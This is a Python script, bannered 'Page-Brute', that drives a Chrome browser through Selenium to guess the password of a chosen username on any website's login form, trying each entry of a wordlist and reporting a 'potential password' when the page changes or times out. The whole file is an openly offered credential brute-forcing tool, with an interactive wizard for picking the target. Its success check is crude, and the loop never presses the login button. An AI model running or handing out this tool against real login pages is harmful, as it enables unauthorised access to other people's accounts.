#!/usr/bin/python3

import sys
import datetime
import selenium
import requests
import time as t
from os import system
from sys import stdout
from selenium import webdriver
from optparse import OptionParser
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support import expected_conditions as EC

#Config
parser = OptionParser()
now = datetime.datetime.now()

#Args
parser.add_option("-u", "--username", dest="username",help="Choose the username")
parser.add_option("--usernamesel", dest="usernamesel",help="Choose the username selector")
parser.add_option("--passsel", dest="passsel",help="Choose the password selector")
parser.add_option("--loginsel", dest="loginsel",help= "Choose the login button selector")
parser.add_option("--passlist", dest="passlist",help="Enter the password list directory")
parser.add_option("--website", dest="website",help="choose a website")
(options, args) = parser.parse_args()

def wizard():
    print (banner)
    website = input('[~]' + ' Enter a website: ')
    sys.stdout.write('[!]' + ' Checking if site exists '),
    sys.stdout.flush()
    t.sleep(1)
    try:
        request = requests.get(website)
        if request.status_code == 200:
            print ('[OK]')
            sys.stdout.flush()
    except selenium.common.exceptions.NoSuchElementException:
        pass
    except:
        t.sleep(1)
        print ('[X]')
        t.sleep(1)
        print ('[!]' + ' Website could not be located make sure to use http / https')
        exit()

    username_selector = input('[~]' + ' Enter the username selector: ')
    password_selector = input('[~]' + ' Enter the password selector: ')
    login_btn_selector = input('[~]' + ' Enter the Login button selector: ')
    username = input('[~]' + ' Enter the username to brute-force: ')
    pass_list = input('[~]' + ' Enter a directory to a password list: ')
    brutes(username, username_selector, password_selector, login_btn_selector, pass_list, website)
    
def brutes(username, username_selector, password_selector, login_btn_selector, pass_list, website):
    f = open(pass_list, 'r')
    driver = webdriver.Chrome()
    optionss = webdriver.ChromeOptions()
    #optionss.add_argument('--disable-gpu')
    #optionss.add_argument('--headless')
    optionss.add_argument('--disable-popup-blocking')
    optionss.add_argument('--disable-extensions')
    optionss.add_argument('--no-sandbox')
    browser = webdriver.Chrome(options=optionss)
    wait = WebDriverWait(browser, 10)
    while True:
        try:
            for line in f:
                browser.get(website)
                wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, login_btn_selector)))                
                Sel_user = browser.find_element(by=By.CSS_SELECTOR, value=username_selector)
                Sel_pas = browser.find_element(by=By.CSS_SELECTOR, value=password_selector)
                enter = browser.find_element(by=By.CSS_SELECTOR, value=login_btn_selector)
                Sel_user.send_keys(username)
                Sel_pas.send_keys(line)
                print ('------------------------')
                print ('Tried password: ' + line + 'for user: ' + username)
                print ('------------------------ \n')
                t.sleep(2)
        except KeyboardInterrupt:
            print('[!]' + ' CTRL+C - Operation aborted by user')
            exit()
        except selenium.common.exceptions.NoSuchElementException:
            print ('AN ELEMENT HAS BEEN REMOVED FROM THE TARGETPAGE \nMAYBE THE PASSWORD WAS FOUND! \nOR MAYBE YOU WERE BLOCKED... \n')
            print ('Potencial Password has been found: {0}' .format(line))
            exit()
        except selenium.common.exceptions.TimeoutException:
            print ('THERE IS A TIMEOUT ON TARGETPAGE, \nMAYBE THE PASSWORD WAS FOUND! \nOR MAYBE YOU WERE BLOCKED... \n')
            print ('Potencial Password has been found: {0}' .format(line))
            exit()

banner = '''
######                             ######                             
#     #   ##    ####  ######       #     # #####  #    # ##### ###### 
#     #  #  #  #    # #            #     # #    # #    #   #   #      
######  #    # #      #####  ##### ######  #    # #    #   #   #####  
#       ###### #  ### #            #     # #####  #    #   #   #      
#       #    # #    # #            #     # #   #  #    #   #   #      
#       #    #  ####  ######       ######  #    #  ####    #   ###### 

 [x]-> v1.0.5
 [x]-> coded by KTSociety
 [x]-> brute-force-tool for Python 3
 [x]-> code based on the "Hatch" script from METACHAR
'''.format()

if options.username == None:
    if options.usernamesel == None:
        if options.passsel == None:
            if options.loginsel == None:
                if options.passlist == None:
                    if options.website == None:
                        wizard()

username = options.username
username_selector = options.usernamesel
password_selector = options.passsel
login_btn_selector = options.loginsel
website = options.website
pass_list = options.passlist
print (banner)
brutes(username, username_selector, password_selector, login_btn_selector, pass_list, website)
